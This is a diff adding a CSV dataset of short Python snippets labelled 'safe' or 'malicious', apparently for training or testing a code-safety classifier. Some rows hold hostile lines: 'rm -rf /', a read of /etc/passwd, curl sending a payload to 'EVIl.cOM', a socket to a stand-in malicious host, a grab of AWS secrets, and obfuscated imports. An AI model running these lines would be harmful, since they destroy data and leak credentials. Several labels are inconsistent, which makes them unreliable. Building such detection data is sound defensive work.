@@ -1,0 +1,83 @@
+﻿Script,Output
+"def FactoriAL(n):
+    rEtuRN 1 IF n == 0 eLSe N * FaCTorial(N - 1)",safe
+"iMPOrt mAth
+PrINT(MAtH.SqRT(16))",safe
+"def is_palindrome(s):
+    s = s.lower().replace(' ', '')
+    return s == s[::-1]",safe
+"naMeS = ['ALIce', 'Ym9C', 'c2RmbnNkbGdu']
+For nAMe iN NAmES:
+    prInT(nAmE)",safe
+"dEF add(A, b): REturN a + b",safe
+"import math
+print(math.sqrt(16))",safe
+"with open('/etc/passwd', 'r') as f:
+    print(f.read())",malicious
+"import os
+os.system('rm -rf /')",malicious
+"iMpOrT SoCKeT
+S = SoCKeT.SOcKeT()
+s.cOnNecT(('mAlicIOus.CoM', 6666))",malicious
+"impORT subProceSS
+SUBpROCeSS.rUN(['CUrl', '-d', 'MAlIcious_payLoad', 'hTTP://EVIl.cOM'])",malicious
+"exec(""""""import os
+os.system('echo hacked')"""""")",malicious
+"def calculate_sum(numbers):
+    return sum(numbers)",safe
+"import pandas as pd
+
+def analyze_data(filename):
+    df = pd.read_csv(filename)
+    return df.describe()",safe
+"def validate_email(email):
+    import re
+    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
+    return bool(re.match(pattern, email))",safe
+"from subprocess import check_output
+output = check_output(['ls', '-l'])",malicious
+"import socket
+s = socket.socket()
+s.connect(('example.com', 80))",malicious
+"xyz = __import__('os')
+result = xyz.system('echo test')",malicious
+"def endless():
+    while 1:
+        pass",malicious
+"import platform as p
+info = p.uname()",malicious
+"x = 'o'+'s'
+y = getattr(__import__(x), 'listdir')",malicious
+path = bytes.fromhex('2f6574632f706173737764').decode(),malicious
+data = [i * i for i in range(10**8)],malicious
+"import requests
+
+def get_user_data(user_id):
+    response = requests.get(f'https://api.example.com/users/{user_id}')
+    return response.json()",safe
+exec('imp' + 'ort ' + 'o' + 's'),malicious
+"import json
+
+def save_config(data, filename):
+    with open(filename, 'w') as f:
+        json.dump(data, f)",safe
+"def process():
+    x = 1
+    while x != 2: x = 1",malicious
+"import os as env
+secrets = env.environ.get('AWS_SECRET_KEY')",malicious
+"from cryptography.fernet import Fernet
+
+def encrypt_data(data):
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    return f.encrypt(data.encode())",safe
+"s = getattr(__import__('socket'), 'socket')()
+s.connect(('localhost', 8080))",malicious
+"class Config:
+    def __init__(self):
+        self.debug = False
+        self.max_connections = 100
+        self.timeout = 30",safe
+"from time import sleep
+while True: sleep(0.1)",malicious
